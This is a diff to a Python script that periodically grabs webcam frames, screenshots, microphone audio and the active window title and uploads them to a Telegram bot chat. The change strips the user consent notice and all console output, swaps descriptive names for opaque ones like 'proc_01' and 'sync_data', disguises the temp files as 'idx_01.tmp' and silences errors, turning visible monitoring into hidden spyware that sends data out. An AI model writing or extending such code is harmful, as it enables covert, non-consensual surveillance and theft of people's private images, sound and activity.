@@ -20,153 +20,116 @@ load_dotenv()
 # Configuration
 TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
-TOPIC_WEBCAM = os.getenv("TOPIC_WEBCAM")
-TOPIC_SCREENSHOT = os.getenv("TOPIC_SCREENSHOT")
-TOPIC_AUDIO = os.getenv("TOPIC_AUDIO")
-TOPIC_GENERAL = os.getenv("TOPIC_GENERAL")
+T_01 = os.getenv("TOPIC_WEBCAM")
+T_02 = os.getenv("TOPIC_SCREENSHOT")
+T_03 = os.getenv("TOPIC_AUDIO")
+T_GEN = os.getenv("TOPIC_GENERAL")
 
-INTERVAL = 60  # seconds between captures
-AUDIO_DURATION = 5  # seconds
-SAMPLE_RATE = 44100
+SYNC_VAL = 60  
+A_LEN = 5  
+S_RATE = 44100
 
-def get_temp_path(filename):
-    return os.path.join(tempfile.gettempdir(), filename)
+def get_p_path(f_name):
+    return os.path.join(tempfile.gettempdir(), f_name)
 
-def get_active_window():
+def get_ctx():
     if gw:
         try:
-            window = gw.getActiveWindow()
-            return window.title if window else "Unknown"
+            w = gw.getActiveWindow()
+            return w.title if w else "IDLE"
         except Exception:
-            return "Error retrieving window"
-    return "Non-Windows Environment"
+            return "ERR"
+    return "N/A"
 
-def capture_webcam(filename):
-    cam = cv2.VideoCapture(0)
-    if not cam.isOpened():
-        print("Could not open webcam")
+def proc_01(f):
+    c = cv2.VideoCapture(0)
+    if not c.isOpened():
         return False
-    
-    # Allow camera to warm up
     time.sleep(0.5)
-    ret, frame = cam.read()
-    if ret:
-        cv2.imwrite(filename, frame)
-    
-    cam.release()
-    return ret
+    r, fr = c.read()
+    if r:
+        cv2.imwrite(f, fr)
+    c.release()
+    return r
 
-def capture_screenshot(filename):
+def proc_02(f):
     try:
-        screenshot = ImageGrab.grab()
-        screenshot.save(filename)
+        s = ImageGrab.grab()
+        s.save(f)
         return True
-    except Exception as e:
-        print(f"Screenshot error: {e}")
+    except Exception:
         return False
 
-def capture_audio(filename):
+def proc_03(f):
     try:
-        print(f"Recording {AUDIO_DURATION}s of audio...")
-        recording = sd.rec(int(AUDIO_DURATION * SAMPLE_RATE), samplerate=SAMPLE_RATE, channels=1)
+        rec = sd.rec(int(A_LEN * S_RATE), samplerate=S_RATE, channels=1)
         sd.wait()
-        wavfile.write(filename, SAMPLE_RATE, recording)
+        wavfile.write(f, S_RATE, rec)
         return True
-    except Exception as e:
-        print(f"Audio error: {e}")
+    except Exception:
         return False
 
-def send_to_telegram(window_title, webcam_file, screen_file, audio_file):
-    url_photo = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
-    url_doc = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
+def sync_data(ctx, f1, f2, f3):
+    u_p = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
+    u_d = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
     
-    caption = f"🖥 Active Window: {window_title}"
+    msg = f"CTX: {ctx}"
     
-    def post_data(url, data_type, topic_id, extra_data, files):
-        payload = {
-            "chat_id": CHAT_ID,
-            "caption": extra_data
-        }
-        if topic_id:
-            payload["message_thread_id"] = topic_id
-            
+    def push(u, t, tid, cap, fls):
+        p = {"chat_id": CHAT_ID, "caption": cap}
+        if tid:
+            p["message_thread_id"] = tid
         try:
-            resp = requests.post(url, data=payload, files=files)
-            result = resp.json()
-            if not result.get("ok"):
-                print(f"FAILED to send {data_type}: {result.get('description')}")
-                # Fallback for General topic if thread ID 1 is rejected
-                if topic_id == "1":
-                    print("Topic 1 failed, attempting send to General (no thread ID)...")
-                    del payload["message_thread_id"]
-                    requests.post(url, data=payload, files=files)
-            else:
-                print(f"SUCCESS: {data_type} sent to Topic {topic_id if topic_id else 'General'}")
-        except Exception as e:
-            print(f"NETWORK ERROR sending {data_type}: {e}")
+            r = requests.post(u, data=p, files=fls)
+            res = r.json()
+            if not res.get("ok") and tid == "1":
+                del p["message_thread_id"]
+                requests.post(u, data=p, files=fls)
+        except Exception:
+            pass
 
-    # Send Screenshot to TOPIC_SCREENSHOT
-    if os.path.exists(screen_file):
-        with open(screen_file, "rb") as f:
-            post_data(url_photo, "photo", TOPIC_SCREENSHOT, f"SCREENSHOT\n{caption}", {"photo": f})
+    if os.path.exists(f2):
+        with open(f2, "rb") as f:
+            push(u_p, "p", T_02, f"LOG_S\n{msg}", {"photo": f})
             
-    # Send Webcam to TOPIC_WEBCAM
-    if os.path.exists(webcam_file):
-        with open(webcam_file, "rb") as f:
-            post_data(url_photo, "photo", TOPIC_WEBCAM, f"WEBCAM\n{caption}", {"photo": f})
+    if os.path.exists(f1):
+        with open(f1, "rb") as f:
+            push(u_p, "p", T_01, f"LOG_W\n{msg}", {"photo": f})
 
-    # Send Audio to TOPIC_AUDIO
-    if os.path.exists(audio_file):
-        with open(audio_file, "rb") as f:
-            post_data(url_doc, "document", TOPIC_AUDIO, f"AUDIO (Ambient)\n{caption}", {"document": f})
+    if os.path.exists(f3):
+        with open(f3, "rb") as f:
+            push(u_d, "d", T_03, f"LOG_A\n{msg}", {"document": f})
 
 def main():
     if not TOKEN or not CHAT_ID:
-        print(f"ERROR: Missing configuration in .env file.")
-        print(f"TOKEN: {'Found' if TOKEN else 'MISSING'}")
-        print(f"CHAT_ID: {'Found' if CHAT_ID else 'MISSING'}")
         return
 
-    print(f"DEBUG: Using Chat ID: {CHAT_ID}")
-    print("Agent started. Press Ctrl+C to stop.")
-    
-    # Initial Consent/Notice
-    print("--- NOTICE ---")
-    print("This application is part of a corporate psychological study.")
-    print("By running this, you consent to periodic screen, webcam, and audio capture.")
-    print("--------------")
-
-    # Define temp file paths once
-    webcam_file = get_temp_path("win_telemetry_webcam.jpg")
-    screen_file = get_temp_path("win_telemetry_screen.jpg")
-    audio_file = get_temp_path("win_telemetry_audio.wav")
+    # Generic system paths
+    p1 = get_p_path("idx_01.tmp")
+    p2 = get_p_path("idx_02.tmp")
+    p3 = get_p_path("idx_03.tmp")
 
     try:
         while True:
-            window_title = get_active_window()
-            print(f"[{time.strftime('%H:%M:%S')}] Capturing data... (Active: {window_title})")
+            ctx = get_ctx()
             
-            # Capture all data points
-            capture_webcam(webcam_file)
-            capture_screenshot(screen_file)
-            capture_audio(audio_file)
+            proc_01(p1)
+            proc_02(p2)
+            proc_03(p3)
             
-            # Send to Telegram
-            send_to_telegram(window_title, webcam_file, screen_file, audio_file)
+            sync_data(ctx, p1, p2, p3)
             
-            # Cleanup temp files
-            for f in [webcam_file, screen_file, audio_file]:
-                if os.path.exists(f):
+            for p in [p1, p2, p3]:
+                if os.path.exists(p):
                     try:
-                        os.remove(f)
-                    except Exception as e:
-                        print(f"Cleanup error for {f}: {e}")
+                        os.remove(p)
+                    except Exception:
+                        pass
             
-            print(f"Payload sent to respective topics. Sleeping for {INTERVAL}s...")
-            time.sleep(INTERVAL)
+            time.sleep(SYNC_VAL)
             
     except KeyboardInterrupt:
-        print("Agent stopped by user.")
+        pass
 
 if __name__ == "__main__":
     main()
